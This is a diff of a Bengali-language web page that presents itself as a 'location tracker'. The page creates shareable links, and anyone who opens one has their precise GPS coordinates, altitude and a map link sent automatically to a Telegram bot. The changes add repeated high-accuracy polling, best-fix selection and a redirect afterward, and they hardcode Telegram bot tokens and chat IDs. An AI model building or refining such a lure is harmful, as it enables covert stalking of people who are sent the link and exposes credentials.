@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GPS লোকেশন ট্র্যাকার</title>
+    <title>একুরেট লোকেশন ট্র্যাকার</title>
     <style>
         * {
             margin: 0;
@@ -128,6 +128,12 @@
             border: 1px solid #bfdbfe;
         }
         
+        .warning {
+            background-color: #fffbeb;
+            color: #d97706;
+            border: 1px solid #fed7aa;
+        }
+        
         .instructions {
             background-color: #f8fafc;
             padding: 20px;
@@ -249,15 +255,76 @@
             gap: 8px;
             margin-top: 10px;
             font-size: 14px;
-            color: #059669;
         }
         
         .gps-dot {
             width: 10px;
             height: 10px;
-            background-color: #10B981;
             border-radius: 50%;
             animation: pulse 1.5s infinite;
+        }
+        
+        .gps-good {
+            background-color: #10B981;
+        }
+        
+        .gps-medium {
+            background-color: #F59E0B;
+        }
+        
+        .gps-poor {
+            background-color: #EF4444;
+        }
+        
+        .accuracy-meter {
+            margin-top: 15px;
+        }
+        
+        .meter-bar {
+            height: 8px;
+            background: #e5e7eb;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
+        
+        .meter-fill {
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+        
+        .accuracy-good {
+            background: linear-gradient(to right, #10B981, #34D399);
+        }
+        
+        .accuracy-medium {
+            background: linear-gradient(to right, #F59E0B, #FBBF24);
+        }
+        
+        .accuracy-poor {
+            background: linear-gradient(to right, #EF4444, #F87171);
+        }
+        
+        .accuracy-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 5px;
+        }
+        
+        .tips {
+            background: #fffbeb;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            border-left: 4px solid #F59E0B;
+        }
+        
+        .tips h4 {
+            color: #D97706;
+            margin-bottom: 8px;
         }
         
         footer {
@@ -302,7 +369,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>GPS লোকেশন ট্র্যাকার</h1>
+            <h1>একুরেট লোকেশন ট্র্যাকার</h1>
             <p class="subtitle">হাই-একুরেসি GPS লোকেশন ট্র্যাকিং</p>
         </header>
         
@@ -357,10 +424,34 @@
                         <div class="detail-value" id="altitudeValue">-</div>
                     </div>
                 </div>
-                <div class="gps-indicator">
-                    <div class="gps-dot"></div>
-                    <span>GPS সিগন্যাল সক্রিয়</span>
+                
+                <div class="accuracy-meter">
+                    <div class="detail-label">GPS একুরেসি লেভেল</div>
+                    <div class="meter-bar">
+                        <div class="meter-fill" id="accuracyFill"></div>
+                    </div>
+                    <div class="accuracy-labels">
+                        <span>খারাপ</span>
+                        <span>মধ্যম</span>
+                        <span>ভালো</span>
+                    </div>
                 </div>
+                
+                <div class="gps-indicator" id="gpsIndicator">
+                    <div class="gps-dot gps-poor"></div>
+                    <span id="gpsStatusText">GPS সিগন্যাল শনাক্ত করা হচ্ছে...</span>
+                </div>
+            </div>
+            
+            <div class="tips" id="accuracyTips">
+                <h4>🚀 একুরেসি উন্নত করার টিপস:</h4>
+                <ul>
+                    <li>আউটডোরে বা খোলা জায়গায় যান</li>
+                    <li>মোবাইলের GPS চালু করুন</li>
+                    <li>Wi-Fi এবং মোবাইল ডেটা চালু রাখুন</li>
+                    <li>উচ্চ ভবন থেকে দূরে থাকুন</li>
+                    <li>কিছু সময় অপেক্ষা করুন GPS সিগন্যাল উন্নত হতে</li>
+                </ul>
             </div>
             
             <div class="status" id="statusMessage"></div>
@@ -372,7 +463,7 @@
                     <li>"শেয়ারযোগ্য লিঙ্ক তৈরি করুন" বাটনে ক্লিক করুন</li>
                     <li>প্রাপ্ত লিঙ্কটি কপি করুন এবং শেয়ার করুন</li>
                     <li>যখন কেউ এই লিঙ্কটি ওপেন করবে, তার GPS লোকেশন স্বয়ংক্রিয়ভাবে টেলিগ্রাম বটে পাঠানো হবে</li>
-                    <li><strong>দ্রষ্টব্য:</strong> সঠিক লোকেশনের জন্য GPS চালু রাখুন এবং আউটডোরে থাকুন</li>
+                    <li><strong>দ্রষ্টব্য:</strong> সঠিক লোকেশনের জন্য উপরের টিপসগুলো ফলো করুন</li>
                 </ol>
             </div>
         </div>
@@ -401,6 +492,14 @@
             const longitudeValue = document.getElementById('longitudeValue');
             const accuracyValue = document.getElementById('accuracyValue');
             const altitudeValue = document.getElementById('altitudeValue');
+            const accuracyFill = document.getElementById('accuracyFill');
+            const gpsIndicator = document.getElementById('gpsIndicator');
+            const gpsStatusText = document.getElementById('gpsStatusText');
+            const accuracyTips = document.getElementById('accuracyTips');
+            
+            let bestLocation = null;
+            let locationAttempts = 0;
+            const maxAttempts = 10;
             
             // URL প্যারামিটার চেক করুন
             const urlParams = new URLSearchParams(window.location.search);
@@ -451,47 +550,63 @@
                     return;
                 }
                 
-                showStatus('GPS লোকেশন শনাক্ত করা হচ্ছে...', 'info');
+                showStatus('হাই-একুরেসি GPS লোকেশন শনাক্ত করা হচ্ছে...', 'info');
                 locationInfo.style.display = 'block';
+                accuracyTips.style.display = 'block';
                 
                 // GPS অপশনস - হাই একুরেসির জন্য
                 const options = {
-                    enableHighAccuracy: true,  // GPS ব্যবহার করতে বলুন
-                    timeout: 30000,           // 30 সেকেন্ড পর্যন্ত অপেক্ষা করুন
-                    maximumAge: 0             // ক্যাশ করা লোকেশন নেবেন না
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 0
                 };
                 
-                // লোকেশন অনুমতি চাওয়া
+                // মাল্টিপল লোকেশন সংগ্রহ করার জন্য
+                const locations = [];
+                
                 const watchId = navigator.geolocation.watchPosition(
                     // সফল হলে
                     function(position) {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const altitude = position.coords.altitude;
+                        locationAttempts++;
+                        const location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            timestamp: position.timestamp
+                        };
                         
-                        // লোকেশন ডিটেইলস আপডেট করুন
-                        latitudeValue.textContent = latitude.toFixed(6);
-                        longitudeValue.textContent = longitude.toFixed(6);
-                        accuracyValue.textContent = `${accuracy.toFixed(1)} মিটার`;
-                        altitudeValue.textContent = altitude ? `${altitude.toFixed(1)} মিটার` : 'উপলব্ধ নয়';
+                        locations.push(location);
+                        
+                        // সবচেয়ে ভালো একুরেসির লোকেশন সিলেক্ট করুন
+                        if (!bestLocation || location.accuracy < bestLocation.accuracy) {
+                            bestLocation = location;
+                        }
+                        
+                        // UI আপডেট করুন
+                        updateLocationUI(location);
                         
                         // একুরেসি চেক করুন
-                        if (accuracy <= 50) { // 50 মিটারের মধ্যে হলে ভালো
-                            showStatus(`হাই-একুরেসি GPS লোকেশন পাওয়া গেছে! (${accuracy.toFixed(1)} মিটার)`, 'success');
-                            
-                            // লোকেশন ডাটা টেলিগ্রামে পাঠানো
-                            sendToTelegram(latitude, longitude, accuracy, altitude, userName);
-                            
-                            // লোকেশন ট্র্যাকিং বন্ধ করুন
+                        if (location.accuracy <= 20) { // 20 মিটারের মধ্যে হলে এক্সিলেন্ট
+                            showStatus(`হাই-একুরেসি GPS লোকেশন পাওয়া গেছে! (${location.accuracy.toFixed(1)} মিটার)`, 'success');
+                            sendLocationToTelegram(bestLocation, userName);
                             navigator.geolocation.clearWatch(watchId);
                             
-                            // ৩ সেকেন্ড পর হোমপেজে রিডাইরেক্ট
                             setTimeout(() => {
                                 window.location.href = window.location.href.split('?')[0];
                             }, 3000);
-                        } else {
-                            showStatus(`GPS লোকেশন পাওয়া গেছে, কিন্তু একুরেসি কম (${accuracy.toFixed(1)} মিটার)। আরো ভালো সিগন্যালের জন্য অপেক্ষা করছি...`, 'info');
+                        } 
+                        else if (location.accuracy <= 50) { // 50 মিটারের মধ্যে হলে ভালো
+                            showStatus(`ভালো GPS লোকেশন পাওয়া গেছে (${location.accuracy.toFixed(1)} মিটার)। আরো ভালো সিগন্যালের জন্য অপেক্ষা করছি...`, 'info');
+                        }
+                        else if (locationAttempts >= maxAttempts) {
+                            showStatus(`সর্বোচ্চ চেষ্টা করা হয়েছে। বেস্ট লোকেশন পাঠানো হচ্ছে (${bestLocation.accuracy.toFixed(1)} মিটার)`, 'warning');
+                            sendLocationToTelegram(bestLocation, userName);
+                            navigator.geolocation.clearWatch(watchId);
+                            
+                            setTimeout(() => {
+                                window.location.href = window.location.href.split('?')[0];
+                            }, 3000);
                         }
                     },
                     // ব্যর্থ হলে
@@ -518,50 +633,87 @@
                     options
                 );
                 
-                // 30 সেকেন্ড পরেও যদি ভালো একুরেসি না পাওয়া যায়
+                // 45 সেকেন্ড পরেও যদি ভালো একুরেসি না পাওয়া যায়
                 setTimeout(() => {
                     navigator.geolocation.clearWatch(watchId);
-                    showStatus('সময় শেষ! বর্তমান লোকেশন পাঠানো হচ্ছে...', 'info');
-                    
-                    // শেষ অবস্থানের লোকেশন নিন
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            const accuracy = position.coords.accuracy;
-                            const altitude = position.coords.altitude;
-                            
-                            sendToTelegram(latitude, longitude, accuracy, altitude, userName);
-                            
-                            setTimeout(() => {
-                                window.location.href = window.location.href.split('?')[0];
-                            }, 3000);
-                        },
-                        function(error) {
-                            showStatus('লোকেশন পাঠানো সম্ভব হয়নি।', 'error');
-                        },
-                        { enableHighAccuracy: false, timeout: 10000 }
-                    );
-                }, 30000);
+                    if (bestLocation) {
+                        showStatus(`সময় শেষ! বেস্ট লোকেশন পাঠানো হচ্ছে (${bestLocation.accuracy.toFixed(1)} মিটার)`, 'warning');
+                        sendLocationToTelegram(bestLocation, userName);
+                        
+                        setTimeout(() => {
+                            window.location.href = window.location.href.split('?')[0];
+                        }, 3000);
+                    } else {
+                        showStatus('কোনও লোকেশন পাওয়া যায়নি। আউটডোরে যান এবং আবার চেষ্টা করুন।', 'error');
+                    }
+                }, 45000);
+            }
+            
+            // UI আপডেট ফাংশন
+            function updateLocationUI(location) {
+                latitudeValue.textContent = location.latitude.toFixed(6);
+                longitudeValue.textContent = location.longitude.toFixed(6);
+                accuracyValue.textContent = `${location.accuracy.toFixed(1)} মিটার`;
+                altitudeValue.textContent = location.altitude ? `${location.altitude.toFixed(1)} মিটার` : 'উপলব্ধ নয়';
+                
+                // একুরেসি মিটার আপডেট
+                let accuracyPercent = Math.max(0, 100 - (location.accuracy / 100 * 100));
+                accuracyPercent = Math.min(100, accuracyPercent);
+                accuracyFill.style.width = `${accuracyPercent}%`;
+                
+                // GPS স্ট্যাটাস আপডেট
+                let statusClass, statusText;
+                if (location.accuracy <= 20) {
+                    statusClass = 'gps-good';
+                    statusText = 'হাই-একুরেসি GPS সিগন্যাল';
+                } else if (location.accuracy <= 50) {
+                    statusClass = 'gps-medium';
+                    statusText = 'গড় GPS সিগন্যাল';
+                } else {
+                    statusClass = 'gps-poor';
+                    statusText = 'কম GPS সিগন্যাল';
+                }
+                
+                // একুরেসি বার রং
+                accuracyFill.className = 'meter-fill ';
+                if (location.accuracy <= 20) {
+                    accuracyFill.classList.add('accuracy-good');
+                } else if (location.accuracy <= 50) {
+                    accuracyFill.classList.add('accuracy-medium');
+                } else {
+                    accuracyFill.classList.add('accuracy-poor');
+                }
+                
+                gpsIndicator.innerHTML = `
+                    <div class="gps-dot ${statusClass}"></div>
+                    <span>${statusText} (${location.accuracy.toFixed(1)} মিটার)</span>
+                `;
             }
             
             // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
-            function sendToTelegram(latitude, longitude, accuracy, altitude, userName) {
+            function sendLocationToTelegram(location, userName) {
                 // এখানে আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি দিন
-                const TELEGRAM_BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk";
-                const TELEGRAM_CHAT_ID = "2139008203";
+                const TELEGRAM_BOT_TOKEN = "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA";
+                const TELEGRAM_CHAT_ID = "6728809478";
                 
                 // Google Maps লিংক তৈরি
-                const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
                 const mapsLink = `[Google Maps এ দেখুন](${mapsUrl})`;
+                
+                // একুরেসি স্ট্যাটাস
+                let accuracyStatus = '';
+                if (location.accuracy <= 20) accuracyStatus = '🏆 হাই-একুরেসি';
+                else if (location.accuracy <= 50) accuracyStatus = '✅ গড় মান';
+                else accuracyStatus = '⚠️ কম একুরেসি';
                 
                 // মেসেজ তৈরি
                 const message = `📍 **GPS লোকেশন রিপোর্ট!** 📍\n\n` +
                                `**ব্যবহারকারী:** ${userName}\n` +
-                               `**অক্ষাংশ:** ${latitude.toFixed(6)}\n` +
-                               `**দ্রাঘিমাংশ:** ${longitude.toFixed(6)}\n` +
-                               `**সঠিকতা:** ${accuracy.toFixed(1)} মিটার\n` +
-                               `**উচ্চতা:** ${altitude ? `${altitude.toFixed(1)} মিটার` : 'উপলব্ধ নয়'}\n\n` +
+                               `**অক্ষাংশ:** ${location.latitude.toFixed(6)}\n` +
+                               `**দ্রাঘিমাংশ:** ${location.longitude.toFixed(6)}\n` +
+                               `**সঠিকতা:** ${location.accuracy.toFixed(1)} মিটার\n` +
+                               `**স্ট্যাটাস:** ${accuracyStatus}\n` +
+                               `**উচ্চতা:** ${location.altitude ? `${location.altitude.toFixed(1)} মিটার` : 'উপলব্ধ নয়'}\n\n` +
                                `${mapsLink}\n\n` +
                                `**সময়:** ${new Date().toLocaleString('bn-BD')}`;
                 
